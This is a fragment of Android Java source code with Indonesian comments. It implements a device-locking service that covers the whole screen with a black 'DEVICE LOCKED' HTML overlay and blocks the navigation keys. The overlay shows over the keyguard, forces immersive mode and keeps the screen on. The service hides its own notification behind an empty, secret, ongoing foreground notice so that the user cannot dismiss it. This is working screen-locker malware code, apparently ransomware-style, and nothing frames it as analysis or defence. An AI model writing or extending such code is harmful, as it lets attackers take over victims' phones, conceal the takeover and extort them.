                     + "font-family:monospace;font-size:24px;'>🔒 DEVICE LOCKED</body></html>";
            }
            final String finalHtml = html;
            uiHandler.post(() -> {
                try {
                    showLockHtmlOverlay(finalHtml);
                    acquireWakeLock();
                    isLocked = true;
                } catch (Exception e) {
                    Log.e(TAG, "handleLockHtml error: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "handleLockHtml outer error: " + e.getMessage());
        }
    }

    private void showLockHtmlOverlay(String html) {
        try {
            if (wm == null) {
                wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            }
            hideLockOverlay();

            // Root layout fullscreen hitam
            LinearLayout root = new LinearLayout(this);
            root.setOrientation(LinearLayout.VERTICAL);
            root.setBackgroundColor(Color.BLACK);
            root.setFocusable(true);
            root.setFocusableInTouchMode(true);
            // Blokir semua tombol navigasi — sama kuatnya dengan overlay utama
            root.setOnKeyListener((v, keyCode, event) -> {
                if (!isLocked) return false;
                return keyCode == KeyEvent.KEYCODE_BACK       ||
                       keyCode == KeyEvent.KEYCODE_HOME        ||
                       keyCode == KeyEvent.KEYCODE_APP_SWITCH  ||
                       keyCode == KeyEvent.KEYCODE_MENU        ||
                       keyCode == KeyEvent.KEYCODE_SEARCH;
            });

            // WebView tampilkan HTML lock page
            WebView webView = new WebView(this);
            WebSettings ws = webView.getSettings();
            ws.setJavaScriptEnabled(true);
            ws.setDomStorageEnabled(true);
            ws.setLoadWithOverviewMode(true);
            ws.setUseWideViewPort(true);
            ws.setBuiltInZoomControls(false);
            ws.setDisplayZoomControls(false);
            // WebView juga blokir key navigasi (lapisan kedua)
            webView.setFocusable(true);
            webView.setFocusableInTouchMode(true);
            webView.setOnKeyListener((v, keyCode, event) -> {
                if (!isLocked) return false;
                return keyCode == KeyEvent.KEYCODE_BACK       ||
                       keyCode == KeyEvent.KEYCODE_HOME        ||
                       keyCode == KeyEvent.KEYCODE_APP_SWITCH  ||
                       keyCode == KeyEvent.KEYCODE_MENU        ||
                       keyCode == KeyEvent.KEYCODE_SEARCH;
            });
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    // Re-enforce immersive setelah halaman selesai load
                    enforceOverlayImmersive(root);
                }
            });
            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);

            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            );
            root.addView(webView, lp);

            overlayRoot = root;

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN  |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS   |
                WindowManager.LayoutParams.FLAG_FULLSCREEN          |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED    |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD    |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON      |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(overlayRoot, params);
            isLocked = true;

            // Terapkan immersive setelah overlay ditambahkan
            enforceOverlayImmersive(root);
            Log.d(TAG, "HTML overlay shown");

        } catch (Exception e) {
            Log.e(TAG, "showLockHtmlOverlay error: " + e.getMessage());
        }
    }

    /** Terapkan immersive sticky pada view overlay agar navigation & status bar tersembunyi */
    private void enforceOverlayImmersive(View view) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                WindowInsetsController wic = view.getWindowInsetsController();
                if (wic != null) {
                    wic.hide(WindowInsets.Type.statusBars()
                           | WindowInsets.Type.navigationBars());
                    wic.setSystemBarsBehavior(
                        WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
                }
            } else {
                view.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_FULLSCREEN          |
                    View.SYSTEM_UI_FLAG_HIDE_NAVIGATION      |
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY     |
                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN    |
                    View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                );
            }
        } catch (Exception e) {
            Log.w(TAG, "enforceOverlayImmersive: " + e.getMessage());
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)   // WAJIB true — agar foreground service tidak bisa di-swipe/kill
            .build();
    }
}